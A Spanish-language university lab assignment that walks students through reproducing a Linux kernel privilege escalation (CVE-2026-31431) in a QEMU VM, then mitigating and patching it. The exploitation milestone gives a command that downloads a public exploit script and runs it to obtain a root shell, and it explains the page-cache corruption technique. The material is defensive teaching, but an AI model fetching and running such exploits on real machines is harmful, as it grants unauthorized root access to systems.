# Copy Fail — CVE-2026-31431
## Evaluación Práctica | Introducción a UNIX | UIDE
### 9 puntos · 90 minutos · Todo recurso permitido

---

## ¿De qué trata este reto?

En 2026 se descubrió **CVE-2026-31431 "Copy Fail"**: un bug lógico en el subsistema
criptográfico del kernel Linux que existe silenciosamente **desde 2017** y que permite a
cualquier usuario local sin privilegios **obtener root en prácticamente todas las
distribuciones Linux**.

A diferencia de bugs anteriores famosos como Dirty Cow (necesitaba ganar una condición
de carrera) o Dirty Pipe (específico de versión), Copy Fail es un **fallo de lógica en línea
recta**: el mismo script de 732 bytes en Python funciona sin modificaciones en Ubuntu,
Amazon Linux, RHEL y SUSE.

Tu tarea: **reproducir el ataque en un entorno controlado y luego parchearlo.**

---

## Puntaje por hitos

| Hito | Descripción                                  | Puntos |
|------|----------------------------------------------|--------|
| 1    | Kernel vulnerable corriendo, módulo confirmado| 2.0 pts |
| 2    | Exploit exitoso → root shell                 | 3.0 pts |
| 3    | Mitigación temporal aplicada                 | 1.5 pts |
| 4    | Parche permanente aplicado y verificado      | 2.0 pts |
| Bonus| Reporte técnico en tus propias palabras      | 0.5 pts |
| **Total** |                                         | **9.0 pts** |

---

## Paso 0: Configura tu identidad en Git

```bash
git config user.name "TuNombre TuApellido"
git config user.email "tu@email.com"
```

Esto es **obligatorio**. Tu STUDENT_ID viene de `git config user.name`.

---

## Hito 1 — Ambiente vulnerable (2 pts)

### 1.1 Compila el kernel y el rootfs

```bash
make setup
# Esto toma ~20 minutos. Lee el write-up mientras esperas:
# https://xint.io/blog/copy-fail-linux-distributions
```

### 1.2 Arranca la VM vulnerable

```bash
make qemu
```

Deberías ver el prompt: `[student@copy-fail-TuNombre ~]$`

### 1.3 Confirma la vulnerabilidad dentro de la VM

Dentro de QEMU, ejecuta estos comandos y copia la salida:

```sh
# ¿Qué kernel corre?
uname -r

# ¿El módulo vulnerable está cargado?
lsmod | grep alg

# ¿Cuál es tu identidad actual? (debe ser student, NO root)
id
whoami

# ¿AF_ALG está disponible?
cat /proc/modules | grep algif
```

### 1.4 Guarda tu evidencia

Dentro de la VM, ejecuta:

```sh
# Este comando crea el archivo de evidencia directamente
{
  echo "=== HITO 1: KERNEL VULNERABLE CONFIRMADO ==="
  echo "Fecha: $(date)"
  echo "Hostname: $(hostname)"
  echo "Kernel: $(uname -r)"
  echo "Identidad: $(id)"
  echo "Módulos AF_ALG:"
  lsmod | grep -i alg || echo "(no encontrado con lsmod, verificar /proc/modules)"
  echo "algif_aead en /proc/modules:"
  grep algif_aead /proc/modules 2>/dev/null || echo "(no encontrado)"
} > /tmp/hito1.txt && cat /tmp/hito1.txt
```

Desde el HOST (Ctrl+A X para salir de QEMU, luego):

```bash
cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
```

> **Nota:** Si no puedes copiar el archivo directamente de la VM,
> puedes redirigir con QEMU monitor o simplemente copiar el texto
> del terminal y pegarlo en el archivo de evidencia.

### 1.5 Commit del hito 1

```bash
git add evidence/hito1_vuln_confirmed.txt
git commit -m "hito-1: kernel vulnerable confirmado - $(date +%Y-%m-%dT%H:%M)"
git tag -a hito-1 -m "Kernel vulnerable corriendo, algif_aead confirmado"
git push origin main --tags
```

---

## Hito 2 — Explotación exitosa (3 pts)

### 2.1 Obtén el PoC público

El exploit ya está publicado. Búscalo en los repositorios oficiales:

- https://github.com/theori-io/copy-fail-CVE-2026-31431
- https://copy.fail/

El PoC es un script Python de 732 bytes. Lee su código y entiende qué hace.

### 2.2 Transfiere el exploit a la VM

Hay varias formas. La más simple (dentro de la VM):

```sh
# Si la VM tiene conectividad (requiere -net en QEMU):
wget https://copy.fail/exp -O copy_fail_exp.py

# O crea el archivo manualmente pegando el contenido
vi copy_fail_exp.py
```

Si configuraste QEMU con soporte de red, también puedes usar `curl`.

### 2.3 Ejecuta el exploit

```sh
# Dentro de la VM, como usuario student (sin root)
id   # confirma que eres student

python3 copy_fail_exp.py

# Si el exploit funciona, deberías ver algo como:
# uid=0(root) gid=1001(student) groups=1001(student)

id   # ahora deberías ser root
```

> **¿Por qué funciona?** El exploit usa `AF_ALG` + `authencesn` + `splice()`
> para escribir 4 bytes controlados en el page cache de `/usr/bin/su`
> (un binario setuid-root) sin tocar el disco. Luego ejecuta `su` y
> el kernel carga la versión corrompida en memoria → shell root.

### 2.4 Documenta la evidencia

```sh
# Dentro de la VM, como ROOT (después del exploit):
{
  echo "=== HITO 2: EXPLOIT EXITOSO ==="
  echo "Fecha: $(date)"
  echo "Hostname: $(hostname)"
  echo "Identidad POST-exploit: $(id)"
  echo "Kernel: $(uname -r)"
  echo "SHA256 del exploit usado:"
  sha256sum copy_fail_exp.py 2>/dev/null || echo "N/A"
  echo ""
  echo "--- Salida del exploit ---"
  # Pega aquí la salida del exploit
} > /tmp/hito2.txt && cat /tmp/hito2.txt
```

Copia en el host: `evidence/hito2_root_shell.txt`

### 2.5 Commit del hito 2

```bash
git add evidence/hito2_root_shell.txt
git commit -m "hito-2: exploit exitoso, root obtenido - $(date +%Y-%m-%dT%H:%M)"
git tag -a hito-2 -m "CVE-2026-31431 explotado exitosamente"
git push origin main --tags
```

---

## Hito 3 — Mitigación temporal (1.5 pts)

La mitigación oficial antes de poder parchear el kernel es deshabilitar el
módulo `algif_aead`. Esto NO requiere recompilar el kernel.

```sh
# Dentro de la VM, como ROOT
lsmod | grep algif_aead    # confirma que está cargado

# Descargar el módulo
rmmod algif_aead

# Verificar que ya no está
lsmod | grep algif_aead    # debe devolver vacío

# Intentar ejecutar el exploit nuevamente
python3 copy_fail_exp.py   # debe fallar

# Para que persista entre reinicios (en sistemas reales):
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
```

> **Comprende el trade-off:** ¿Qué aplicaciones dejan de funcionar si
> deshabilitas `algif_aead`? Lee la sección MITIGATION de https://copy.fail/

### 3.1 Evidencia

```sh
{
  echo "=== HITO 3: MITIGACIÓN TEMPORAL ==="
  echo "Fecha: $(date)"
  echo "Hostname: $(hostname)"
  echo "algif_aead en lsmod:"
  lsmod | grep algif_aead || echo "(módulo NO cargado - mitigación activa)"
  echo ""
  echo "Intento de exploit post-mitigación:"
  python3 copy_fail_exp.py 2>&1 | head -10 || echo "(exploit falló como se esperaba)"
} > /tmp/hito3.txt && cat /tmp/hito3.txt
```

```bash
git add evidence/hito3_mitigation.txt
git commit -m "hito-3: mitigacion temporal aplicada - $(date +%Y-%m-%dT%H:%M)"
git tag -a hito-3 -m "algif_aead deshabilitado, exploit neutralizado"
git push origin main --tags
```

---

## Hito 4 — Parche permanente (2 pts)

Este es el hito más difícil. Debes aplicar el fix oficial al código fuente del
kernel y recompilar.

### 4.1 Entiende el fix

El parche oficial (`a664bf3d603d` en mainline) revierte la optimización
in-place de 2017 en `crypto/algif_aead.c`. La función problemática es
`_aead_recvmsg()`.

**El problema (2017):** se usó `sg_chain()` para encadenar las páginas del
tag del TX SGL al final del RX SGL y luego se hizo `req->src = req->dst`,
poniendo páginas del page cache en un scatterlist de escritura.

**El fix (2026):** mantener TX SGL y RX SGL separados (`out-of-place`):
```c
// Antes (vulnerable):
aead_request_set_crypt(..., rsgl_src, rsgl_src, ...);  // src == dst

// Después (parcheado):
aead_request_set_crypt(..., tsgl_src, rsgl_dst, ...);  // src != dst
```

### 4.2 Crea el parche

```bash
# En el host, navega al código fuente del kernel
cd kernel/linux/crypto

# Estudia el archivo vulnerable
less algif_aead.c

# Aplica el fix manualmente o usa git diff para crear el parche
# El fix está documentado en el write-up técnico.
# El archivo a modificar es: crypto/algif_aead.c
# La función a corregir: _aead_recvmsg()
```

Guarda tu parche en `patches/fix_algif_aead.patch`:

```bash
cd kernel/linux
git diff crypto/algif_aead.c > /workspaces/copy-fail-challenge/patches/fix_algif_aead.patch
```

### 4.3 Compila el kernel parcheado

```bash
cd /workspaces/copy-fail-challenge
make patch   # aplica el parche y recompila
```

### 4.4 Verifica que el exploit falla

```bash
make qemu-patched
```

Dentro de la VM parcheada:

```sh
python3 copy_fail_exp.py   # debe fallar con error
id                          # debe seguir siendo student, NO root
```

### 4.5 Evidencia y commit

```sh
# Dentro de la VM parcheada
{
  echo "=== HITO 4: PARCHE APLICADO ==="
  echo "Fecha: $(date)"
  echo "Kernel: $(uname -r)"
  echo "Identidad: $(id)"
  echo "Intento exploit post-parche:"
  python3 copy_fail_exp.py 2>&1 | head -10 || echo "(exploit falló)"
} > /tmp/hito4.txt && cat /tmp/hito4.txt
```

```bash
git add evidence/hito4_patched.txt patches/fix_algif_aead.patch
git commit -m "hito-4: parche aplicado, exploit neutralizado - $(date +%Y-%m-%dT%H:%M)"
git tag -a hito-4 -m "Kernel parcheado, CVE-2026-31431 neutralizado"
git push origin main --tags
```

---

## Bonus — Reporte técnico (0.5 pts)

Escribe en `REPORT.md` con **tus propias palabras** (mínimo 300 palabras):

1. ¿Cuál es el bug raíz y en qué archivo/función está?
2. ¿Por qué el write a `dst[assoclen + cryptlen]` es peligroso?
3. ¿Por qué el exploit es "stealthy" (no modifica el archivo en disco)?
4. Conecta esto con lo que vimos en clase: page cache, `chmod`, setuid, inodos
5. ¿Qué aprendiste sobre cómo múltiples cambios "razonables" pueden crear un bug grave?

```bash
git add REPORT.md
git commit -m "bonus: reporte tecnico - $(date +%Y-%m-%dT%H:%M)"
git tag -a bonus -m "Reporte tecnico CVE-2026-31431"
git push origin main --tags
```

---

## Preguntas frecuentes

**¿Puedo usar IA?** Sí. Pero la evidencia debe venir de TU VM con TU STUDENT_ID.

**¿Puedo trabajar con un compañero?** Cada uno debe tener su propio repositorio,
su propia VM (con su STUDENT_ID), y sus propios archivos de evidencia con timestamps diferentes.

**¿El exploit daña el host?** No. Opera dentro de la VM QEMU. El page cache corrompido es el de la VM.

**¿El parche debe ser exactamente igual al oficial?** El efecto debe ser el mismo:
separar `req->src` y `req->dst`. La implementación puede variar.

---

## Verificación rápida

```bash
make verify    # comprueba localmente qué hitos tienes completados
make grade     # puntuación estimada
```

---

*CVE-2026-31431 fue descubierto por Theori/Xint Code y divulgado el 29 de abril de 2026.
El parche oficial está en el mainline Linux como commit `a664bf3d603d`.*
